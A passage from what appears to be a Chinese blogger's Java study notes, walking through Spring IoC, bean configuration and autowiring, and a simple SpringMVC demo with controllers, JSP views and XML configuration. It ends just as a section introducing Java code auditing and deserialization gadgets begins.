Beans。</p><p>即,IoC容器是一个具有依赖注入功能的容器，它可以创建对象，IoC容器负责实例化、定位、配置应用程序中的对象及建立这些对象间的依赖。</p><p>IOC容器的使用很大程度上是为了解决开发过程中,出现一个系统有大量的组件，其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。因此使用了IOC。</p><p>同时。控制反转这个概念意味着应用程序只需使用已经配置好的组件，那么”依赖注入”这个概念就随之而出了。我们不是new一个对象。而是注入它到其他组件中。这样我们节省了编写配置代码的时间。同时注入也意味着我们可以将这个组件注入到其他类中。体现了组件共享的简单。</p><p>也正因如此。我们要让IOC容器知道怎样配置组件。所以才有了上面的使用xml文件进行bean的配置这一做法。</p><p>spring提供了两种IOC容器。一种是我们用过了的<code>ApplicationContext</code>.还有一种是比较轻量的<code>BeanFactory</code>.</p><blockquote><p>二者的主要区别在于，如果Bean的某一个属性没有注入，则使用BeanFacotry加载后，在第一次调用getBean()方法时会抛出异常，而ApplicationContext则在初始化时自检，这样有利于检查所依赖的属性是否注入。因此，在实际开发中，通常都选择使用ApplicationContext，而只有在系统资源较少时才考虑使用BeanFactory。</p></blockquote><p>具体用法跟上面的demo没有区别。只是实例化类的区别。因此不再提及。</p><p>如果要把上面的流程再仔细分析下的话。其实第一句<code>ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);</code>是加载了bean的配置文件。并且初始化好对象。第二句则使用<code>getBean()</code>这个方法通过配置文件中的 beanid返回真正的对象并使用其调用任何方法。</p><ul><li>bean</li></ul><p>Bean是一个被实例化、组装、并通过Spring IoC容器所管理的对象。这些Bean是由用容器提供的配置元数据创建的，例如前面看到的在XML的表单中的定义。</p><p>demo中出现的几个bean的元素</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id 是一个 Bean 的唯一标识符，Spring 容器对 Bean 的配置和管理都通过该属性完成</span><br><span class="line">class 该属性指定了 Bean 的具体实现类，它必须是一个完整的类名，使用类的全限定名</span><br><span class="line">property &lt;bean&gt;元素的子元素，用于调用 Bean 实例中的 Set 方法完成属性赋值，从而完成依赖注入。该元素的 name 属性指定 Bean 实例中的相应属性名</span><br></pre></td></tr></table></figure><p>因此上面bean的xml配置其实是做了这样的注入的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld a= <span class="keyword">new</span> HelloWorld();</span><br><span class="line">a.setMessage(<span class="string">"byc_404"</span>);</span><br></pre></td></tr></table></figure><p>spring中实例化bean除了简单的使用构造方法的构造器实例化。还有静态工厂实例化,实例工厂方式实例化。这些我个人认为可以暂时不用深入了解。主要还是理解了IOC,依赖注入这样的理念。用起来就有明确的思路了。</p><ul><li>bean装配</li></ul><p>前面似乎一直在说得使用xml文件进行bean的指定。但实际上可以不使用xml进行配置。xml配置实际可能存在难以维护的缺点。因此可以使用其他方法进行装配。</p><p>可以使用Annotation来进行配置。<br>常用的几个注解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@Required @Required注释应用于bean属性的setter方法，它表明受影响的bean属性在配置时必须放在XML配置文件中</span><br><span class="line">@Component 可以使用此注解描述Spring中的Bean，但它是一个泛化的概念，仅仅表示一个组件（Bean），并且可以作用在任何层次。使用时只需将该注解标注在相应类上即可。</span><br><span class="line">@Repository 用于将数据访问层（DAO层）的类标识为Spring中的Bean，其功能与@Component 相同。</span><br><span class="line">@Service 通常作用在业务层（Service 层），用于将业务层的类标识为Spring中的Bean，其功能与@Component相同。</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>通常我们在类中注明了相关的annotation后，beans.xml配置如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--使用context命名空间，通知spring扫描指定目录，进行注解的解析--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"top.bycsec"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就会在选定的包里自动寻找bean了。</p><p>同样我们还可以自动装配bean.</p><p>TextEditor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextEditor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SpellChecker spellChecker;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSpellChecker</span><span class="params">( SpellChecker spellChecker )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.spellChecker = spellChecker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> SpellChecker <span class="title">getSpellChecker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> spellChecker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spellCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        spellChecker.checkSpelling();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpellChecker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpellChecker</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SpellChecker</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside SpellChecker constructor."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkSpelling</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside checkSpelling."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainApp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"beans.xml"</span>);</span><br><span class="line">        TextEditor te = (TextEditor) context.getBean(<span class="string">"textEditor"</span>);</span><br><span class="line">        te.spellCheck();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>beans.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for textEditor bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"textEditor"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.TextEditor"</span> <span class="attr">autowire</span>=<span class="string">"byName"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"byc_404"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for spellChecker bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"spellChecker"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.SpellChecker"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意这里我们使用自动装配,也就是配置bean的autowire属性。比如此处的byName就是指：    根据 Property 的 name 自动装配，如果一个 Bean 的 name 和另一个 Bean 中的 Property 的 name 相同，则自动装配这个 Bean 到 Property 中。这里我们textEditor这个bean定义设置为自动装配byName，并且它包含spellChecker属性（即它有一个 setSpellChecker(…) 方法），那么Spring就会查找定义名为spellChecker的bean，并且用它来设置这个属性<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/27.PNG" alt></p><p>如果我们不用自动调用。那么beans.xml中的配置就需要额外设置property</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"textEditor"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.TextEditor"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"spellChecker"</span> <span class="attr">ref</span>=<span class="string">"spellChecker"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"byc_404"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同理。我们还可以使用byType等autowire属性值来进行自动装配。</p><p>今天先看到这。spring的内容还是比较多的</p><h3 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h3><p>今天简单写个springmvc的demo。其实看了眼廖雪峰老师的spring教程。发现spring的项目基本都是maven构建的。实际上我们就算单纯使用idea中springmvc开发，也可以加入maven结构。</p><p>我个人看了下网上csdn的几种写法。有点惊讶有的根本没有写出mvc的作用,有的方法完全拘泥于原来servlet的写法,没有用上spring自己的依赖。最后找到一个阿里云的demo才真正理解了其结构。下面来实际操作下。</p><p>首先idea创建springmvc项目。当然刚刚提到了创建maven项目然后引入spring依赖也是可以的。这里我们就暂且先使用idea来帮助我们直接处理好spring的依赖吧。</p><p>刚创建完项目首先要注意一点。需要在ProjectStructure =&gt; Artifact 中将两个spring的依赖加入到WEB-INF/lib中。否则待会我们使用tomcat部署时会报错。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/28.PNG" alt></p><p>接下来先用不加注解的方法写一个class。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Helloworld</span> <span class="keyword">implements</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handleRequest</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ModelAndView modelAndView = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        modelAndView.addObject(<span class="string">"name"</span>,<span class="string">"byc_404"</span>);</span><br><span class="line">        modelAndView.setViewName(<span class="string">"hello"</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>底下addObject是加载模型数据。setViewName则是选定模型视图。这里视图不使用hello.jsp而是hello是方便书写。我们后面直接在配置中定义后缀即可。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page isELIgnored=<span class="string">"false"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Hello World&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Hello $&#123;name&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>hello.jsp 使用SpEL表达式。即获取我们刚刚的模型数据输出到视图。<br>然后是项目创建时自动生成的dispatcher-servlet.xml。这里可以修改我们bean的相关参数。比如此处设置路由<code>/helloworld</code>。利用beanid让其对应class为HelloWorld.以及视图是在web根目录下找后缀为jsp的文件。<br>配置文件bean部分如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"handlerMapping"</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.handler.SimpleUrlHandlerMapping"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mappings"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"/helloworld"</span>&gt;</span>testHandler<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"testHandler"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.Helloworld"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>.jsp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后加载tomcat配置跑起来即可。访问根目录是index.jsp内容。访问<code>/helloworld</code>则是hello.jsp<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/29.PNG" alt></p><p>当然。这种写法肯定是麻烦了。刚好昨天学过了spring 中自动装载bean的用法。那么此处当然也可以利用注解+配置自动装载bean</p><p>新写一个AnnotationHandler类。这里使用注解<code>@Controller</code>将其置为控制器。同时设定其路由为<code>/mdoel</code>。数据与视图跟刚刚差不多。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/model"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView  <span class="title">modelAndViewTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ModelAndView modelAndView = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        modelAndView.addObject(<span class="string">"name"</span>,<span class="string">"byc_404"</span>);</span><br><span class="line">        modelAndView.setViewName(<span class="string">"show"</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show.jsp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page isELIgnored=<span class="string">"false"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Model&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Testing model by $&#123;name&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>dispatcher-servlet.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"top.bycsec"</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>.jsp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接扫描top.bycsec包十分方便。现在我们访问<code>/model</code>路由<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/30.PNG" alt><br>最终项目路径<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/31.PNG" alt></p><p>如果要在上面基础上接受参数或者设置路由基本跟servlet差不多</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 实际URL映射是/user/profile</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/profile"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">profile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实际URL映射是/user/changePassword</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/changePassword"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">changePassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/signin"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">doSignin</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        @RequestParam(<span class="string">"email"</span>)</span> String email,</span></span><br><span class="line"><span class="function">        @<span class="title">RequestParam</span><span class="params">(<span class="string">"password"</span>)</span> String password,</span></span><br><span class="line"><span class="function">        HttpSession session) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如编写的是大量接口的代码(rest api)。spring还提供了<code>@RestController</code>来代替<code>@Controller</code>.这样接口的方法自动变成api方法。数据也是restapi的json数据。</p><h2 id="Audit"><a href="#Audit" class="headerlink" title="Audit"></a>Audit</h2><p>这一部分用于学习java代码审计中一些常见漏洞的深层原理。比如之前反序列化中利用链的深层原因还没有全部学清楚。一些特定情况下的payload编写也还需要基础知识作为底层支持。</p><p>真正接触了实战才会发现java在现在仍旧是建站的首选，并且往往可以拿到权限较高的shell.也幸好最近接触java相对更多了点，所以才有胆量去探究这些漏洞利用的底层。</p><h3 id="deserialization-gadgets"><a href="#deserialization-gadgets" class="headerlink" title="deserialization gadgets"></a>deserialization 